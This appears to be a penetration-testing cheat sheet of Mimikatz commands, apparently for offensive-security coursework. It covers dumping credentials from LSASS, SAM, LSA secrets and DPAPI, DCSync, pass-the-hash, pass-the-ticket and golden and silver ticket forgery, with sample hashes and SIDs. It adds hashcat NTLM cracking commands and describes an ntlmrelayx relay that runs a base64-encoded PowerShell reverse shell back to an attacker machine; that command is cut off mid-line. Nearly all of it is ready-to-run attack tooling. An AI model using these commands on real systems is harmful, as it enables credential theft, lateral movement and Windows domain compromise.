# Using Mimikatz

> Resource: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

Usages: Invoke-Mimikatz -Command '"lsadump::trust /patch"

```
#general
privilege::debug
log
log customlogfilename.log


#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```



```
Trust keys
Invoke-Mimikatz-Command '"sekurlsa::keys"

#Dump from SAM data base
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

#all domain users
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#schedule task Users
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'


```

### Cracking NTLM <a href="#cracking-ntlm" id="cracking-ntlm"></a>

```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force



NTLMv2
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying Net-NTLMv2 <a href="#relaying-net-ntlmv2" id="relaying-net-ntlmv2"></a>

**impacket-ntlmrelayx** package. We'll use **--no-http-server** to disable the HTTP server since we are relaying an SMB connection and **-smb2support** to add support for SMB2 We'll also use **-t** to set the target to FILES02. Finally, we'll set our command with **-c**, which will be executed on the target system as the relayed user. We'll use a PowerShell reverse shell one-liner, which we'll **base64-encode** and execute with the **-enc** argument as we've done before in this course. We should note that the **base64-encoded** PowerShell reverse shell one-liner is shortened in the following listing, but it uses the IP of our Kali machine and port 8080 for the reverse shell to connect.

Copy

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell
```
